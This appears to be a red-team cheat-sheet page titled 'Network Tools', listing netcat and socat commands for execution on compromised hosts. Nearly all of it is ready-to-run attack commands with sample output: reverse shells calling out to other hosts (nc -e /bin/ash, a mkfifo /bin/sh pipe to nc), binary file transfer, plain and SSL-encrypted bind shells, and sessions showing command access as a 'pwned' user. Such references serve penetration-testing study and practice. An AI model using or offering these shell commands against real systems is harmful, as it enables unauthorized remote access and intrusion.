---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/network-tools
---

# Network Tools

## Netcat

```bash
nc 10.10.10.10 4444 -e /bin/ash

nc -c bash 10.10.10.11 5555
nc -c /bin/sh 10.10.10.11 5555
```

### Netcat - Bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.187 4444 >/tmp/f
```

### Netcat - File Transfer

```
$ nc -nlvp 4444 > incoming.exe
$ nc -nv 10.10.10.10 4444 < /usr/share/windows-resources/binaries/wget.exe
```



## Socat

Using <mark style="color:red;">**-**</mark> allow keyboard to interactive the shell with remote host.&#x20;

```bash
└─$ nc -lvp 80 -e /bin/bash                             
listening on [any] 80 ...

└─$ sudo socat - TCP4:127.0.0.1:80                     
id
uid=1000(pwned) gid=1000(pwned) groups=1000(pwned),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video)
whoami
pwned
```

Bind Port 80 and redirect standard output

```bash
└─$ nc -lvp 80 -e /bin/bash
listening on [any] 80 ...

└─$ sudo socat TCP4:127.0.0.1:80 STDOUT               
id
uid=1000(pwned) gid=1000(pwned) groups=1000(pwned),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video)
whoami
pwned
```

### Socat - File Transfer

Hosted file to share on socat

```basic
└─$ sudo socat TCP4-LISTEN:80,fork file:/usr/bin/nc
```

Connect and retrieved the file

```basic
└─$ socat tcp4:127.0.0.1:80 file:nc,create 
└─$ ll
-rw-r--r-- 1 kali kali 34952 Sep  1 21:39 nc
```

### Socat - Reverse Shell

Let start socat listener on port 80

```basic
socat -d -d - tcp4-listen:80 (or) socat -d -d tcp4-listen:80 stdout
```

Let connect to our reverse shell with execute /bin/bash

```basic
socat tcp4:127.0.0.1:80 exec:/bin/bash
```

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

### Socat Encrypted Bind Shells

Let generate SSL Certificate&#x20;

```bash
└─$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
Generating a RSA private key
..................................+++++
...........................+++++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:cam
string is too long, it needs to be no more than 2 bytes long
Country Name (2 letter code) [AU]:KH
State or Province Name (full name) [Some-State]:PP
Locality Name (eg, city) []:PP
Organization Name (eg, company) [Internet Widgits Pty Ltd]:ABC    
Organizational Unit Name (eg, section) []:ABC
Common Name (e.g. server FQDN or YOUR name) []:   
Email Address []:

└─$ ls
bind_shell.crt  bind_shell.key
```

Then, covert the certificate to the file that socat accept

```basic
└─$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Let create socat listener&#x20;

```basic
└─$ socat openssl-listen:80,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Let connect to remote host for execute command

```basic
└─$ socat - openssl:127.0.0.1:80,verify=0                        
id
uid=1000(pwned) gid=1000(pwned) groups=1000(pwned),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),133(scanner),141(kaboxer)
whoami
pwned
```
